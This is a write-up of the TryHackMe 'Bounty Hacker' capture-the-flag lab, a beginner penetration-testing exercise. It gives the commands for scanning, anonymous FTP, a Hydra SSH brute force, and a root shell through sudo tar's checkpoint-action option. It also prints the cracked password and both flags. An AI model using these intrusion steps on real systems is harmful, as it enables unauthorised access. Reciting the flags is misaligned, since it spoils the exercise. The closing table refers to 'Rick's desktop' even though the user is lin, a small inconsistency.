# 🏴‍☠️ TryHackMe - Bounty Hacker

**Platform:** TryHackMe  
**Challenge Type:** Boot2Root  
**Author:** Gage Ayala ([@GageGotya](https://github.com/GageGotya))  
**Date:** April 9, 2025  
**Difficulty:** ⭐ Easy  

---

## 📘 Overview

The **Bounty Hacker** room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.  
You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.

> 🔎 A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.

---

## 🌐 Information Gathering

**Target IP:** _Provided by the room_

### 🔍 Nmap Scan

```bash
nmap -sC -sV <target-ip>

Ports Discovered:

    21/tcp - FTP (vsftpd 3.0.3, anonymous login allowed)

    22/tcp - SSH (OpenSSH 7.2.2)

    80/tcp - HTTP (Apache httpd 2.4.18)

📂 FTP Access

ftp <target-ip>
Name: anonymous

📁 Files Discovered

ftp> ls
locks.txt
task.txt

ftp> get locks.txt
ftp> get task.txt

🧾 task.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin

🧠 Username hint: lin
🧾 locks.txt

Custom password list found — likely reused creds.
🔓 Gaining Access
🚀 Brute Forcing with Hydra

hydra -l lin -P locks.txt ssh://<target-ip>

✅ Cracked password: RedDr4gonSynd1cat3
🔐 SSH Access

ssh lin@<target-ip>

🏁 User Flag

cat ~/Desktop/user.txt

Flag:

THM{CR1M3_SyNd1C4T3}

🪜 Privilege Escalation
🔍 Sudo Permissions

sudo -l

User lin may run the following command on bountyhacker:
(root) /bin/tar

🧨 Exploiting tar

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

whoami
root

👑 Root Flag

cat /root/root.txt

Flag:

THM{80UN7Y_h4cK3r}

💡 Reflections

    Anonymous FTP often opens the door to quick wins 🚪

    Password reuse is a goldmine for brute-force attacks 🔑

    sudo -l is your best friend — always check it 🛠️

    Simple tools like tar can be deadly in the wrong hands (or the right ones 😉)

🧠 Pro Tip

    "When in doubt, poke around, read everything, and always try the simple stuff first."

📁 Summary of Key Files
File	Description
locks.txt	Password list for brute-force
task.txt	Username clue and initial objectives
user.txt	First flag on Rick's desktop
root.txt	Final flag after privilege escalation
